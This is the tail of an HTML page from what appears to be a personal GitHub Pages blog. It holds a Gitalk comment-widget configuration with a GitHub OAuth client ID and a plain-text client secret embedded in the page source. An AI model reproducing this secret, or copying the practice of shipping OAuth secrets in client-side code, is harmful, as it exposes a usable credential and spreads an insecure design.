<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"pullp","repo":"pullp.github.io","client_id":"fe859336a9fbdeb3f2dc","client_secret":"10b651022b6a16968955aa45ac4537b2d97686de","admin_user":"pullp","distraction_free_mode":true,"language":"zh-CN","js":{"url":"https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"b68bcabb15b2f3d1619e7c38f0ff31e3"}</script>
<script src="/js/third-party/comments/gitalk.js"></script>

</body>
</html>
